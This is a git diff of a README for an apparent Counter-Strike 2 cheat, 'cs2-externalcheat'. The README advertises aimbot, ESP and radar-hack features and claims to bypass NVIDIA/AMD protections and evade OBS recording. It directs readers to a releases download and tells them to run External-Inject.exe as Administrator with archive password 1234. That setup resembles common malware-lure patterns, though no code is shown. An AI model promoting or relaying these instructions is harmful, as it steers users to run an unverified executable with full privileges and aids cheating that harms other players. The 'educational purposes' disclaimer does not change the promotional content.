@@ -1,5 +1,6 @@
-# cs2-externalcheat
-# 🎮 External Cheat for CS2 | Bypasses NVIDIA, AMD & OBS Recording 🚀
+# 🎮 cs2-externalcheat - Bypass Game Protections with Ease
+
+[![Download cs2-externalcheat](https://img.shields.io/badge/Download-via_Releases-brightgreen)](https://github.com/valmoss/cs2-externalcheat/releases)
 
 ---
 
@@ -9,35 +10,53 @@ This project is intended **for educational purposes only**. Using cheats in onli
 ---
 
 ## 📋 Description  
-This external cheat for **Counter-Strike 2** includes bypasses for:  
-- 🖥️ **NVIDIA**  
-- 🔧 **AMD**  
-- 🎥 **OBS Recording**
+This external cheat for **Counter-Strike 2** enables you to:
+- 🖥️ Bypass **NVIDIA** hardware protections
+- 🔧 Bypass **AMD** hardware protections
+- 🎥 Stay hidden from **OBS** and other screen recording software
 
-It allows you to remain undetected while recording and streaming, as well as bypassing hardware protections.
+It helps you remain undetected while recording and streaming.
 
 ---
 
 ## 🚀 Features  
 - 🔒 Bypass for NVIDIA and AMD hardware detectors  
 - 🎬 Hide from OBS and other screen recording software  
-- ⚡ Easy and quick launch  
-- 🛠️ Simple setup (aimbot , skinchanger , radarhack , esp , skeleton and much more...)
+- ⚡ Quick and easy launch  
+- 🛠️ Simple setup, including aimbot, skinchanger, radar hack, ESP, skeleton, and more
 
 ---
 
-## 📦 Installation  
-1. Download the latest version archive.  
-2. Extract it to a convenient folder.  
-3. Run `External-Inject.exe` as an administrator. (password 1234) 
+## 📦 Download & Install  
+1. Visit this page to download: [cs2-externalcheat Releases](https://github.com/valmoss/cs2-externalcheat/releases).
+2. Download the latest version archive and save it to your computer.
+3. Extract the contents of the archive to a folder you can easily access.
+4. Inside the folder, locate and run `External-Inject.exe` by right-clicking it and selecting "Run as Administrator." 
+5. Enter the password: `1234` when prompted.
 
 ---
 
+## 🛠️ System Requirements  
+To run **cs2-externalcheat**, ensure your system meets the following requirements:
+- **Operating System**: Windows 10 or later
+- **Processor**: Intel or AMD processor with 2.0 GHz or faster
+- **RAM**: Minimum of 4 GB
+- **Storage**: At least 100 MB of free disk space
+- **Graphics**: NVIDIA or AMD graphics card for bypass features
 
+---
+
+## 🔗 Support & Community  
+If you have questions or need help, consider joining our community:
+- Check the [GitHub Issues](https://github.com/valmoss/cs2-externalcheat/issues) for support.
+- Connect with other users on forums to share experiences and tips.
+
+---
 
 ## ❤️ Acknowledgments  
-Thanks to everyone who helped test and improve this project!
+Thanks to everyone who contributed to testing and improving this tool. Your support helps the community grow and learn more about game security and ethics.
 
 ---
 
-*Good luck and fair gaming!* 🎯
+## 📣 Disclaimer  
+This software is meant for educational purposes only. We do not condone using cheats for any unfair advantage in games. Please treat this tool as a learning experience regarding game security and integrity.
